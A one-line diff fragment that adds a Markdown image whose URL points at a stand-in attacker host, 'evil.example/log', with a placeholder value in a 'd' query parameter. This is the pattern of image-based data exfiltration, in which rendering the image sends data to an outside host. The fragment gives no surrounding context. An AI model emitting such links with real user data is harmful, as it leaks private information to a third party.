@@ -1,0 +1,1 @@
+![](https://evil.example/log?d=REDACTED_VALUE_GOES_HERE)
